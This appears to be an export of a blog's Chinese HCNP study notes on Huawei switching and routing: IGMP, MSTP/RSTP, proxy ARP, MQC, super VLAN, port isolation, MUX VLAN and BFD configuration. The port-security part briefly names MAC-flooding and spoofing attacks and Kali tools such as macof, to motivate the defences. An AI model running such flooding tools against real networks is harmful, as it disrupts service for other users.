255.0.0.0 2.0.0.254 MCS1的组播地址为：226.1.1.1 MCS1的源IP地址为：2.0.0.100 --------------------------------------------- sys sys R1 int g0/0/0 ip add 1.0.0.254 24 int g0/0/1 ip add 2.0.0.254 24 ---------------------------------------------- multicast routing-enable //开启全局组播路由功能 int g0/0/1 pim dm int g0/0/0 pim dm dis pim rou //查看pim路由 int g0/0/0 //在成员的接口打开igmp igmp enable //在成员的接口打开igmp dis IGMP group//查看igmp group 路由协议IGP EGP BGP IGP下边有rip，IGMP，isis，ospf等，IGP是在一个AS内定义的路由协议。 IGMP 组播组管理协议工作机制 主机加入或离开组播组 路由器维护组播组 查询器选举 成员报告抑制 IGMP IGMP v1报文格式 主机报告report igmp version 1or2or3 //可以选择IGMP的版本 dis igmp g //查询igmp全局 路由器查询query，路由器每隔60秒查询一次。 IGMPv1工作机制 IGMPv1问题：组成员离开 dis igmp group verbose//查询igmp组信息 dis igmp interface g0/0/0 //查看IGMP接口信息 //IGMPV1查询器用的是pim查询，定一个DR作为查询器的角色 //IGMPV2查询器有单独的机制 IGMPv2报文格式 igmp version 2 //开启IGMP版本二 igmp enable //全局开启igmp dis igmp int g0/0/0 // 查看某个接口的IGMP信息 dis IGMP group //查看igmp组成员信息 IGMPv2工作机制 当有成员离开时，路由器会立即发送两个特定组查询包，查询228的组播 IGMPv3概述 IGMPv3工作机制及改进之处 // 224.0.0.1 指包含所有节点,包含路由器，包含主机 dis igmp group 230.0.0.1 verbose //查看igmp详细组信息 IGMPv3数据包格式 igmpv3 PC配置 当不删除1.1.1.1的组播源地址时再次加入一个新的组播源2.2.2.2，原来的1.1.1.1仍然存在，这个时候就需要添加模式来改变， include 包含只要1.1.1.1 ，加入新的就再次包含2.2.2.2 exclude除了2.2.2.2 其他都要 IGMPv3主机和路由器交互过程 当主机B不想要2.2.2.2的组播源发送的组播时，他会发送一个BLOCK数据包，告诉路由器，不想要2.2.2.2的组播源主播，然后路由器为了确保其他有没有成员，要2.2.2.2的数据的话，他会发送一个特定组查询，看有没有成员感兴趣，如果有一个成员对2.2.2.2感兴趣，就会回一个报告。本来我要两个服务器的，现在我要一个服务器的，但是其他成员说我还要2.2.2.2，这个时候路由器仍然需要记住2.2.2.2. block：屏蔽 Change To Include （Null）改变为包含模式，包含为空，清空路由器的组播组信息。 V3离开报文，发送地址数为0，即代表离开 IGMP版本对比","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"组播","slug":"组播","permalink":"http://sakuramuxia.github.io/tags/%E7%BB%84%E6%92%AD/"},{"name":"IGMP","slug":"IGMP","permalink":"http://sakuramuxia.github.io/tags/IGMP/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记12","slug":"hcnp12","date":"2021-06-06T07:09:00.000Z","updated":"2021-06-06T07:16:03.818Z","comments":true,"path":"post/dbc8.html","link":"","permalink":"http://sakuramuxia.github.io/post/dbc8.html","excerpt":"","text":"MSTP 说明： 华为的设备默认是mstp； MSTP简介 dis stp b //查看stp状态 dis stp region-configuration //查看stp区域配置 说明：默认实例0包含了所有的VLAN。 MSTP基本架构 MST域 说明：域中有多个实例，多个实例单独计算它各自的生成树，所以这个就是MSTP，基于实例计算生成树，不是基于VLAN计算生成树，而是基于实例计算生成树，这个就是行业标准，可以把一个VLAN或多个VLAN配制成一个实例，思科默认的私有的一个VLAN对应一个实例叫做PVST+（Per VLAN stp ），RSTP对应的为Rpvst+。 MSTP配置 hello包的时间间隔为2s不是20s，还有一个参数叫做最大跳数，最大跳数也是20， check region-configuration //检查命令。在提交之前打上这个命令。 实验 stp priority 0 //调整stp优先级为根桥 stp root primary //调整stp优先级为根桥 tracert xxx //在二层是看不到信息的，因为tracert 是三层的 说明： 如果根桥没有好好设计就会造成，绕路的情况。 一个设备这样打完这个配置 先配置 最基本的VLAN配置通信，然后配置stp域四个交换机都配置一遍，最后配置实例的根桥。就可以了，验证的时候一定要看实例10 和实例20 的接口 角色 dis stp b //查看stp状态 dis stp instance xx brief //仅查看实例xx的接口配置 //链路聚合就变成了一个逻辑口,相当于一根线 配置案例1、四台交换机全部刷一遍，修订版本号没有配置默认为0 2、配置相关的优先级 stp instance 2 cost 200000 //为了当swa的上行链路发生故障时，能够从swa的汇聚转swb的汇聚，而不是从swc的接入转swd的接入这种方式。 // vrrp 默认优先级为100 MSTP+VRRP组合组网 dis vrrp bri //查看VRRP配置 说明： 当配置了边缘端口后，lsw3上边的接口（lsw3到lsw1）down了之后不会丢包，原因在于RSTP中有一个条件就是非边缘端口发生变化时，lsw3到lsw2的链路的阻塞状态就立刻变成了转发状态，同步机制（lsw2会让lsw3的其余链路都阻塞）会导致lsw3到pc1之间的链路变成阻塞，因为有P/A机制，但是当配置了边缘端口后，lsw2到lsw3之间的同步就和pc1没有关系了， smart-link //2001的mstp，没有更新版本了，之后华为等厂商私有的smart-link是为了优化链路的恢复更快。 STP、RSTP、MSTP对接：向下兼容 STP版本对比 CIST=CST+IST stp mode stp //更改stp模式 dis stp int g0/0/0 //查看stp接口状态","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"BPDU","slug":"BPDU","permalink":"http://sakuramuxia.github.io/tags/BPDU/"},{"name":"MSTP","slug":"MSTP","permalink":"http://sakuramuxia.github.io/tags/MSTP/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记11","slug":"hcnp11","date":"2021-06-04T05:40:00.000Z","updated":"2021-06-04T06:01:02.521Z","comments":true,"path":"post/da88.html","link":"","permalink":"http://sakuramuxia.github.io/post/da88.html","excerpt":"","text":"RSTP 说明： stp 根桥故障，直连故障，非直连故障，至少得等30s的时间， listen→ forwarding delay →leaning 经过30秒的时间， 才能变成forwardind 转发状态 IEEE ：I3E Rapid：迅速快捷 Mstp继承了Rstp的优化然后解决了stp和rstp共同的一个问题。 java python stp问题 RSTP RSTP的端口状态 RSTP的端口角色 注意： backup端口是半双工问题。多用在集线器的附近，集线器是一个傻瓜的设备，是一个信号复制的设备，这些端口都在一个冲突域中，他的工作原理是从一个接口接收到一个数据他会从其他端口复制一份出去，SWC发往集线器的bpdu会从集线器重新传回来，先比较开销，然后比较BID，比较对端BID，比较接口PID。 切换stp模式stp mode mstp //切换stp模式为mstp //角色发生变化，状态也立即发生了变化。 实例 RSTP的BPDU格式STP BPDU的数据包结构 proposal：提议 RSTP 数据包结构 针对问题一：P/A机制 边缘端口：指连接终端的端口。 swa 发送一个P置位的BPDU过去，告诉swb我是指定端口，端口状态为阻塞状态，P置位代表我要给你进行协商，swb收到后，会进行一件事情SYN，这个syn会阻塞 边缘端口外的其他端口，连接端口的可以配制成边缘端口，swb会回一个aggrement同意，当swa收到A置位的BPDU报文后端口立即进入Forwarding。 swb和swa的协商不是立即就完成的，swb如果发送一个P置位，swc回应一个A置位，swb和swa的协商就立即完成了，当这条链路不是全双工的状态时，就需要等待两个Forward。 集线器是半双工的状态，全双工 stp mode rstp //开启rstp模式 dis stp b //查看stp状态 dis stp interface g1/0/1 //查看全双工半双工模式 stp point-to-point force-false or true//stp强制点到点 //配置接口速率 sys port-group portgroup1 // 创建永久端口组portgroup1 group-member g0/0/1 to g0/0/3 //将g0/0/1g0/0/2 g0/0/3加入portgroup组 [port-group portgroup1] undo negotiation auto //批量关闭自动协商 [port-group portgroup1] duplex full //批量配置全双工模式 [port-group portgroup1] speed 100 //批量配置接口速率为100M //同样也可以进入相关的接口进行单独的配置 int g0/0/0 //进入相关的接口 undo negotiation auto //关闭自动协商速率 duplex full //配置 P置位的数据包 A置位的数据包 TC置位代表一个非边缘端口从阻塞变为了转发状态。 阶段1：各自都是根桥，相互发送P置位。 阶段2：收到P置位数据包后，比较BID，对端BID，PID最后确定根桥，立即把端口状态设置成转发，并且端口角色设置成RP， 阶段3：对端回复了一个数据包。 原来两个端口都是阻塞的状态，发送过来之后，swb立即把阻塞状态变为了转发状态，拓扑发生了变化，swa同样也是这样，立即把状态变成了转发，这个时候这两个包都有TC置位， P/A同步的过程 最上边的交换机为根桥，根桥发送一个P置位，然后中间的交换机收到后，先同步，同步的操作就是除了边缘端口，其他端口都先阻塞，所以3口就阻塞了，左边的因为配置了边缘端口所以就没有阻塞，然后中间的交换机再回复一个A置位，回复A置位的同时中间的交换机变成了转发状态，最上边的交换机状态也变成了转发状态，这段搞定了之后再往下走，继续走P/A机制。 针对问题二：跟端口快速切换机制 针对问题三：此等BPDU处理机制 理解： 当非直连链路挂了之后呢，swb发送一个P置位的BPDU，swb的下口为指定端口，先阻塞，发送一个P置位的，swc收到后发现swb发送的不是最好的，我把最好的也发给swa，同时我也发送A置位的，那么这时候你也转发了，我也转发了，我从AP变成了BP，你从DP变成了RP。 //设置根桥 stp priority root //设置交换机为根桥 stp priority root 0 //设置交换机为根桥 dis stp b //查看stp状态 dis stp int g0/0/0 //查看stp接口状态 1、当LSW1与LSW2之间的链路down了之后，lsw2认为自己是根桥，发送一个P置位。 2、LSW4收到LSW2的P置位后，回复根桥不对，是50，同时发送一个P置位，协商根桥。我是指定端口，我现在是阻塞状态， 3、bb立马就回复一个A置位，说同意，我就是根端口，我已经转发了， 针对问题四：边缘端口的引入 //配置边缘端口 stp edged-port enable //配置边缘端口 undo stp edged-port enable //删除stp边缘端口配置 stp edged-port disable //禁用stp边缘端口 针对问题五：拓扑变更机制的优化 RSTP拓扑改变处理机制 在4秒内发送tc置位的BPDU报文，如果4s到了，他就不发了。这个时间叫做 TC while Time 清空除了收到的口和边缘端口的mac地址 拓扑变化引发的问题 RSTP和STP优化总结 maxage：默认是20s Timer Factor：默认是1s 保护功能： 不能说错了，不能说岔了，能答上来。 RSTP配置 int range g0/0/1 to g0/0/24 //进入一个接口组进行批量配置 stp edge-port enable //配置端口为边缘端口在端口下 stp edged-port default //配置边缘端口在全局下 int g0/0/0 //进入接口 stp edged-port disable //某一个端口禁用掉在端口下 RSTP保护 BPDU保护 //配置完边缘端口之后，要进行验证 dis stp int g0/0/0 //配置BPDU //验证是否是激活状态 //当在端口配置了边缘端口，但是接入了交换机这个情况，边缘端口就会失效。 解决方案 相关配置 stp bpdu-protection //开启边缘端口保护的BPDU，在全局模式下配置 //当error down之后，再启用，就需要restart。 dis error-down recovery //查看error down情况 根保护 //通过抓包,通过嗅探可以抓到数据流量。 //windows tasklist /svc netstat -ano 10.0.200.10 相关配置 stp primary xxxx//更改stp根桥优先级 stp root primary //配置根端口 stp root secondary //更改优先级为第二 BPDU保护：你别动，你一动，我就咬你。 根保护：你别装逼，你一装逼，我就不叼你。 TC保护 解决方案 相关配置 dis stp tc-bpdu statistics //查看stp tc-bpdu 发送统计情况 环路保护 在全局配置，他会自动感知是不是根端口还是边缘端口 思科方案 //bpdu 过滤 stp bpdu-filter //bpdu过滤 portfast //端口链路快速 uplinkfast //上行链路快速 Backonefast //骨干网链路fast bpdu filter //bpdu 过滤","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"RSTP","slug":"RSTP","permalink":"http://sakuramuxia.github.io/tags/RSTP/"},{"name":"BPDU","slug":"BPDU","permalink":"http://sakuramuxia.github.io/tags/BPDU/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记10","slug":"hcnp10","date":"2021-05-31T15:40:00.000Z","updated":"2021-06-25T08:04:14.625Z","comments":true,"path":"post/1a49.html","link":"","permalink":"http://sakuramuxia.github.io/post/1a49.html","excerpt":"","text":"代理ARPProxy ARP：如果arp请求是从一个网络的主机发往同一网段却不在同一物理网络上的另一台主机，那么连接他们的具有代理ARP功能的设备就可以回答该请求，这个过程称为代理ARP。 特点： 部署在网关上，网络中的主机不必做任何改动。 可以隐藏物理网络细节，使两个物理网络可以使用同一个网络号。 只影响主机的ARP表，对网关的ARP表和路由表没有影响。 类型： 路由式Proxy ARP 当主机不在同一个网段时，他们会通过查找路由过去，这时候PC2得到的MAC地址是路由器g0/0/1的网关的MAC地址。 当掩码更改成/16时，Pc1和PC2会认为他们处于同一个网段，不需要走网关直接发送Arp请求。但是ARP请求过不去，就拿不到PC2的MAC地址。 //路由式代理ARP配置 int g0/0/0 arp-proxy enable //开启路由式代理arp //当配置一边时,数据包到了g0/0/0,进行解封装，然后再查找路由，再从g0/0/1接口出去，然后PC2进行回包，但是另一边不配置就无法进行通信。 int g0/0/1 arp-proxy enable VLAN内proxy ARP int vlan 1//配置一个VLANIF 接口 ip add 1.0.0.10 24 arp-proxy inner-sub-vlan-proxy enable //开启代理同一个VLAN内的代理arp VLAN间的proxy arp VLAN间proxy arp的主要用途，用在聚合VLAN或者超级VLAN里用的，SUPER VLAN 叫做超级VLAN， 相关配置 MQC流策略 MQC三要素 traffic ? //配置traffic模式 traffic classifier 1 //配置流分类 if-match ? //匹配的范围 //对数据包的理解，对流量的过滤 traffic behavior 1 //配置流行为 说明： cir ：承诺信息速率，car：限速的命令 //模块化的配置 traffic polixy 1 //配置流策略 classifier 1 behavier 1 //调用流分类，调用流行为 流策略在VLAN中应用VLAN内二层隔离：VLAN内用户能够自由隔离（即任意用户间的单、双向隔离） VLAN间三层隔离：禁止部分用户互访或者只允许用户单向访问 MQC配置流程 配置流策略 实例 默认配置： PC1:1.0.0.1 PC2:1.0.0.2 PC3:1.0.0.3 配置： acl 3000 rule permit ip so 1.0.0.1 0 des 1.0.0.3 0 //acl匹配作为条件 sys //acl作为一个条件，然后让流分类进行过滤，流行为做出反应 //配置流分类 traffic classifier pc1topc3 if-match acl 3000 //配置流行为 traffic be pc1topc3 deny //配置流策略 traffic policy wakin classifier pc1topc3 behavior pc1topc3 //在接口进行调用 traffic-polixy wakin inbound //如果出现经常更换端口的情况，在接口调用acl就十分的麻烦，于是可以在VLAN中调用。 vlan 1 traffic-police wakin inbound //在VLAN的入接口进行调用 vlan 100 int g0/0/1 p l a p d v 100 int vlan 1 ip add 1.0.0.254 24 int vlanif 100 ip add 100.0.0.254 24 //需求：拒绝VLAN1内的所有主机访问server服务器 traffic classifier vlan1//新建一个流分类 if-match vlan-id 1 //直接匹配VLAN1的流量，因为数据包有打标签可以知道VLAN1 的ID traffic policy wakin //然后在策略中添加关联流分类和流行为 classifier VLAN1 behavior pc1topc3 //在一个流分类中添加两个条件是有或和与的区分的 traffic classifier hcip if-match acl 3000 if-match vlan-id 1 d th and //同时满足，默认是与的关系 traffic classifier hcip operator ? //更改流分类条件是与还是或的关系 //acl只是匹配路由的工具 Super vlan 像模像样的东西，体现出正式，体现出专业性 SUPER VLAN subvlan：是二层的物理接口，配置VLAN id的，不建立三层VLANIF接口，隔离广播域 SUPER VLAN：是配置IP地址的逻辑3层接口， SUPER VLAN通信规则 subVLAN与其他网络的三层通信Super-VLAN只负责网关的功能 重点： super vlan 只负责网关的功能，主机1发送一个数据帧，交换机收到后打上标签2，主机2发送的数据帧打上标签3，不管是2还是3，因为之前我们从10.1.1.2 去往10.1.2.2，首先不是同一个网段，因为3层通讯，所以我们先找到的是网关的接口，咱们发送arp问的是网关，到了VLAN4的网关，进行二层解封装，到三层，三层一看目标ip，查路由，查完路由以后发现出接口是VLANIF10 接口，这个时候封装二层的时候，封装的标签是10，永远不会封装4的标签，VLANIF4只是负责网关的功能呢进行路由查找，查找出来真正出来的接口是VLANIF10的接口，如果是access则没有标签，如果是trunk，pvid一样也没有标签，pvid不一样就有标签，VLAN4的三层只是作为网关的作用，收到数据帧进行路由查找，找到出接口就可以了，VLANIF4作为SUPER VLAN 是不能跟物理口进行关联的，VLANIF作为一个网关他是一个虚拟口，不能和物理口进行关联。 就算收到一个VLAN4的数据包过来也会丢弃，因为VLANIF4没有对应的物理口进行转发。 sub -VLAN与其他设备的二层通信不会涉及到SUPER-VLAN，与正常的二层通信流程一样 Super VLAN配置 实例 //配置超级VLAN VLAN 10 aggregate-vlan access-vlan 2 3 dis super-vlan //验证超级vlan dis sub-vlan //验证subVLAN int v 10 ip add 192.168.0.254 24 q dhcp enable int vlanif 10 dhcp select interface d th 这样的配置结果就是感觉上是在同一个网段但是她默认是不通的 arp-proxy inter-sub-vlan-proxy //开启vlan间的代理arp，让两个隔离的sub-VLAN进行通信。 端口安全 //dynamic mac 可以同时设置动态mac数量和mac内容,数量默认为1个。先到先得。 //sticky 就相当于两者的特性各有一点，当动态学习到server2的MAC地址后就把它转化成静态的MAC，同时具有静态和动态的特性。 保护动作 //在接口模式下 restart 相当于 shutdown 再undo shutdown //思科默认交换机为shutdown //在系统界面下 error-down auto-recovery cause port-security //接口关闭后会自动恢复 error-down auto-recovery cause mac-address-flapping interval 30 //配置自动恢复的间隔 dis error-down recovery //验证接口关闭后恢复情况 dis mac-address //查看mac地址 dis trapbuffer //查看自动告警的trap缓存信息 dis log //查看系统日志 在汇聚层看到所有mac，然后看在哪个接口，然后在在接入层查看。 实例 ARP欺骗：告诉主机1，我是2我的MAC地址是C。欺骗主机的ARP缓存 MAC欺骗：欺骗交换机的MAC记录 攻击者频繁发送2的MAC地址为B。 dis mac-ad su //查看交换机MAC地址总数 MAC泛洪：制造大量的伪造MAC来频繁更新交换机的MAC地址表 dis mac-ad //查看MAC地址表 发送数据包工具：IPOP V6.1 可以根据改装的数据包发送，欺骗网络设备 Kali系统 桥接回环网卡 yersimia -G //yersimia工具 macof //f代表float泛洪 在kali的cli状态下。 流量性攻击// Dos攻击，拒绝服务攻击，你提供一个DHCP服务，我指派很多人过去把资源消耗完，让正常的主机得不到地址。泛洪类攻击最有效也最可怕。 //清空mac地址缓存 clear mac //思科 reset mac //华为 undo mac address //清楚MAC地址表 每个mac表刷新的时间为300s //大量非法的接入 //限制数量 //限制地址 应用案例 配置命令：port-security enable //开启端口安全 //默认配置是只允许一个安全mac，而且类型是安全动态mac，而且动作是restrict。 dis mac-address security ?//验证查看安全mac配置 int g0/0/3 port-security max-mac-num x //配置端口安全最大的数量 port-security mac-address stick //启用mac stick port-security mac-address stick xxxx-xxxx-xxxx vlan1 //在安全端口启动stick 相关命令：","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"代理ARP","slug":"代理ARP","permalink":"http://sakuramuxia.github.io/tags/%E4%BB%A3%E7%90%86ARP/"},{"name":"MQC流策略","slug":"MQC流策略","permalink":"http://sakuramuxia.github.io/tags/MQC%E6%B5%81%E7%AD%96%E7%95%A5/"},{"name":"SUPER VLAN","slug":"SUPER-VLAN","permalink":"http://sakuramuxia.github.io/tags/SUPER-VLAN/"},{"name":"端口安全","slug":"端口安全","permalink":"http://sakuramuxia.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记9","slug":"hcnp09","date":"2021-05-28T07:10:00.000Z","updated":"2021-05-28T07:27:22.089Z","comments":true,"path":"post/cf16.html","link":"","permalink":"http://sakuramuxia.github.io/post/cf16.html","excerpt":"","text":"隔离技术 实例： 实例说明： pc1和pc2不能互访，pc2可以访问pc3，pc1可以单向访问到pc3，但是这三个PC是在同一个VLAN（广播域）中 //使用acl实现 sys sys sw1 stp disable //PC1 ip地址位为1.0.0.1，PC2 IP地址为1.0.0.2，PC3 IP地址为1.0.0.3 acl 3000 //指定源和目标 rule deny ip so 1.0.0.1 0 des 1.0.0.2 0 //acl拒绝1.0.0.1到1.0.0.2 之间的访问 acl 3001 rule deny ip so 1.0.0.2 0 des 1.0.0.1 0 //acl拒绝1.0.0.2到1.0.0.1 之间的访问 acl 3002 rule deny ip so 1.0.0.3 0 des 1.0.0.1 0 //在SW1的对应接口调用acl int g0/0/1 traffic-filter inbound acl 3000 //在入方向调用acl arp -d //清空arp --windows 环境下运行的命令 int g0/0/2 traffic-filter inbound acl 3001 //在入方向调用acl int g0/0/3 traffic-filter inbound acl 3002 //在入方向调用acl dis traffic-applied interface inbound //验证acl 哪个接口调用了哪些acl 当下边的主机个数多了之后，一个一个写acl这种方式就显得十分不灵活，这种时候就需要一种新技术---端口隔离 端口隔离实现同一VLAN内端口之间的隔离 位于相同端口隔离组内的端口之间无法互相访问。 把多个端口放在一个隔离组中，这个隔离组有编号，比如说1，如果把Fa0/1和Fa0/2放在一个隔离组中，这两个接口的数据转发就不允许了，1口进2口不会出来，2口进1口不会出来。 当把Fa0/1和G0/1放在一个隔离组中，把Fa0/2和G0/1放在一个隔离组中，这样就能让PC1不能访问互联网，PC2不能访问互联网，但是PC1和PC2可以互相访问。 两种模式 说明： 二层隔离三层互通是默认配置，不用敲命令，二层三层均隔离，需要敲命令。 int g0/0/0 //进入相关接口 port-isolate enable //默认是组1，端口隔离开启 int g0/0/1 //进入相关接口 port-isolate enable //默认是组1，端口隔离开启 dis port-isolate group xxx/all //验证端口隔离 int g0/0/2 //进入相关接口 port-isolate enable //默认是组1，端口隔离开启 //无法访问目标主机 代表ARP都过不去 //请求超时 主机没上线 arp -a //如果显示学习到mac地址代表数据包到了，请求到了没有回复。 arp -d //清空arp 均为windows命令 VLAN 4096个 相关配置 应用场景 端口保护/隔离：switchport protect 技术背景：虽然端口进行隔离了，但是仍然有办法打破隔离，实现PC1到PC2的互访。 在默认情况下，PC1的ARP请求是找1.0.0.2，当ARP到AR1时，因为AR1的地址是254，AR1不予回应，当开启代理ARP时，他会发现，AR1可以帮助PC1通过查找路由表，找PC2的MAC地址给PC1， int vlanif 1 //进入三层口 arp-proxy ? enable//开启arp代理 //这样就可以设置成二层隔离，三层通讯。代理ARP的接口会把自己的MAC地址给请求者，然后请求者会把这个MAC地址作为目标ip的MAC地址使用，发送数据包，然后代理ARP接口再查找路由表发送数据包给目标ip设备。 //VLAN间ARP代理模式多用于SUPER-VLAN MUX VLANMultiple VLAN 一种通过VLAN进行网络资源控制的机制 只适用于二层网络中，对同一网段的用户进行互通和隔离 实现处于相同网段的设备划入不同的VLAN后，可以和指定VLAN通讯，可以实现禁止相同VLAN内的不同设备间的通信 即可以同时实现VLAN间互通，VLAN间隔离，VLAN内隔离 对应思科技术：private VLAN 技术术语 接入层场景 汇聚层场景 解决方案 思科 Private VLAN 相关配置 实例 实例配置//SW1配置 sys sys sw1 vlan bat 10 20 30 100 int g0/0/3 p l a p d v 100 int g0/0/1 p l t p t a v 10 20 30 100 int g0/0/2 p l t p t a v 30 //配置MUX VLAN vlan 100 mux-vlan //配置主VLAN subordinate group 10 20 //配置互通性从VLAN subordinate separate 30 //配置隔离性从VLAN dis mux-vlan //验证MUX VLAN配置 int g0/0/3 //进入接口进行调用 port mux-vlan enable //接口启用MUX VLAN //SW2配置 sys sys sw2 vlan bat 10 20 30 100 int g0/0/1 p l a p d v 10 int g0/0/2 p l a p d v 10 int g0/0/3 p l a p d v 20 int g0/0/4 p l a p d v 20 int g0/0/5 p l t p t a v //导入关系 vlan 100 mux-vlan //配置主VLAN subordinate group 10 20 //配置互通性从VLAN subordinate separate 30 //配置隔离性从VLAN //进入接口进行调用开启 int g0/0/1 port mux-vlan enable int g0/0/2 port mux-vlan enable int g0/0/3 port mux-vlan enable int g0/0/4 port mux-vlan enable int range //真机直接进入多个接口进行配置 //SW3配置 sys sys sw3 vlan bat 10 20 30 100 int g0/0/1 p l t p t a v 10 20 30 100 int g0/0/2 p l a p d v 30 int g0/0/3 p l a p d v 30 //导入关系 vlan 100 mux-vlan //配置主VLAN subordinate group 10 20 //配置互通性从VLAN subordinate separate 30 //配置隔离性从VLAN //进入接口进行调用开启 int g0/0/2 port mux-vlan enable int g0/0/3 port mux-vlan enable dis port vlan //验证VLAN关联的接口","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"隔离技术","slug":"隔离技术","permalink":"http://sakuramuxia.github.io/tags/%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF/"},{"name":"MUX VLAN","slug":"MUX-VLAN","permalink":"http://sakuramuxia.github.io/tags/MUX-VLAN/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记8","slug":"hcnp08","date":"2021-05-24T15:41:00.000Z","updated":"2021-05-28T07:23:48.343Z","comments":true,"path":"post/fd7.html","link":"","permalink":"http://sakuramuxia.github.io/post/fd7.html","excerpt":"","text":"BFD为了减少链路，设备故障对业务的影响，提高网络的可靠性，网络设备需要尽快检测与相邻设备间的通信故障，以便及时采取措施，保证业务正常进行。 双向转发检测BFD（Bidirectional Forwarding Detection）提供了一个通用的标准化介质无关和协议无关的快速故障检测机制，用于快速检测、监控网络中链路或者IP路由的转发连通状况。 技术背景：场景一： 不会，需要等待40秒的时间，ospf邻居数据包10秒发一次hello，大概需要30秒才会收敛完成。 VRRP Master数据包每秒发送一次，backup3秒监听确认一次。 场景二： 在没有监视的情况下，通过路由收敛，流量也会从左边走，但是需要大概40秒的时间，而如果配置了路由监视的功能就会很快的改变流量方向，但是还是要等待路由的收敛。 传统检测方法： BFD：Bidirectional Forwording Detection 双向转发检测 一种通用、标准化、介质无关、协议无关的快速故障检测机制。 用于快速检测、监控网络中链路或路由的转发连通状况 不管是物理接口状态、二层链路状态、网络层地址可达性、还是传输层连接状态、应用层协议运行状态、都可以被BFD感知到。 //技术联动 安全防火墙里面有 IPS IDS 告警 通知 防火墙//入侵检测，入侵防御 //认证 portal NAC AAA BFD工作原理 本身没有邻居发现机制，靠被服务的上层应用通知其邻居建立BFD会话。 建立会话后周期性（100ms）发送BFD控制报文进行检测。 检测到故障后，通知被服务的相关应用进行相应的处理。 dis bfd session all //验证BFD会话 BFD会话会话标识符 本地标识符（Local Discriminator） 远程标识符（Remote Discriminator） sys bfd //开启bfd模式 bfd 1 //开启BFD，建立会话 bfd 1 bind peer-ip default-ip interface g0/0/1 //? discriminator local xxx/remote xxx //配置本地or远程标识符 BFD会话建立方式根据标识符配置不同 静态建立BFD会话通过命令行手工配置BFD会话参数，包括配置本地标识符和远程标识符等，然后手工下发BFD会话建立请求。 动态建立BFD会话系统对本地标识符和远端标识符的处理方式如下 动态分配本地标识符当应用程序（ospf）触发动态创建BFD会话时，系统分配属于动态(可以理解成会生成一个随机的数字)会话标识符区域的值作为BFD会话的本地标识符，然后向对端发送Remote Discriminator 的值为0的BFD控制报文，进行会话协商。 自学习远端标识符当BFD会话的一端收到Remote Discriminator 的值为0 的BFD控制报文时，判断该报文是否与本地BFD会话匹配，如果匹配，则学习接收到的BFDLocal Discriminator的值，获取远端标识符。 //高端的设备在配置完成之后要进行提交才能生效 commit //提交 dis ip int b //查看三层接口信息 dis int b //查看二层接口信息 undo portswitch //把接口的模式改成三层接口 注意： commit 提交过后的东西，不能随便改了，不能删除，除非把整个bfd 1 的内容全部删除才可以。 BFD检测机制 两个系统建立BFD会话后，周期性发送BFD控制报文，如果一方在既定的时间内没有收到BFD控制报文，则认为路径上发生了故障。（用时间做检测） 提供异步检测模式。在这种模式下，系统之间相互周期性地发送BFD控制报文，如果某个系统连续几个报文都没有接受到，就认为此BFD会话的状态时Down。（用报文做检测） BFD状态机制 BFD状态机的建立和拆除都采用三次握手（TCP三次握手），以确保两端系统都能知道状态的变化。 BFD报文类型和结构默认组播地址=224.0.0.184 控制报文：单跳说白了就是直连，多跳就是非直连，多用于跨ip路由的检测。 Echo报文：当两端的设备有一个不支持BFD的报文时使用的。 单臂回声：相当于对着山，喊一声能听见回声。 TLD 结构：Auth Type，Auth Len，Authentication Date bfd [Huawei-bfd]default-ip-address ? //更改默认组播地址 X.X.X.X Default multicast address 224.0.0.107-224.0.0.250 //更改默认组播地址目的是当会话多了的时候，也有可能在一条链路上产生冲突，会话的检测，数据包的地址是一个地址，端口也是一个端口，所以会产生冲突。所以这个时候建议修改组播地址，或者更改端口号。 BFD联动功能 监控模块：负责对链路状态、网络性能等进行检测，并将探测结果通知给Track模块。 Track模块：收到检测模块的探测结果后，及时改变Track项的状态，并通知应用模块。 应用模块：根据Track项的状态，进行相应的处理，从而实现联动。 BFD应用场景 BFD检测IP链路在ip链路上建立BFD会话，利用BFD检测机制快速检测故障。 可以直接检测二层的接口，都不用配置IP地址，使用默认的组播地址进行检测。 根据源ip和目标ip，源ip可以不用指定，默认从源接口出去，目标ip要配置。 BFD单臂回声功能 源地址是一个回环口，目标地址是一个出接口。 BFD与接口状态联动 在接口中可以看到BFD的状态Down，但是接口不会Down掉，如果你需要让接口也跟着Down，就需要单独敲一条命令：状态联动。 BFD与静态路由联动 BFD与OSPF联动 BFD与BGP联动 BGP的hello包 60s发一次，180s检测一次。 BFD与VRRP联动 BFD与PIM联动 PIM：组播路由技术 现在都是SD1开局，后边联网，然后后台技术接管，通过管理平台直接刷进去，而不是手动的刷进入几千行的命令，因为链接的节点数太多了，不好管理。 BFD配置 静态配置 dis cu //查看配置文件 动态配置 //如果想要和OSPF联动 //只需要在OSPF下面的进程下输入 bfd all-interfaces enable //配置bfd与OSPF联动 BFD控制报文 //LSW 1配置 bfd bfd 1 bind peer-ip default-ip int G0/0/1 discriminator local 321 discriminator remote 123 commit //单纯的会话，没有技术联动 //LSW 2配置 bfd bfd 1 bind peer-ip default-ip int G0/0/1 discriminator local 123 discriminator remote 321 commit dis bfd int g0/0/1 //查看接口BFD信息 dis bfd configration all //查看BFD配置信息 dis bfd statistics //查看BFD统计信息 dis bfd session peer-ip default-ip verbose //查看BFD详细会话信息 dis b s p xxx.xxx.xxx.xxx ver //上条命令简写 dis bfd session all //查看BFD会话信息 d b s a //查看BFD会话信息 Local Detect Multi :3 倍数为3 Acl Number : 关联Acl AR1与AR2配置单跳检测之后回显 //AR1 配置 sys sys R1 int g0/0/0 ip add 12.0.0.1 24 bfd bfd 1 bind peer-ip 12.0.0.2 int G0/0/0 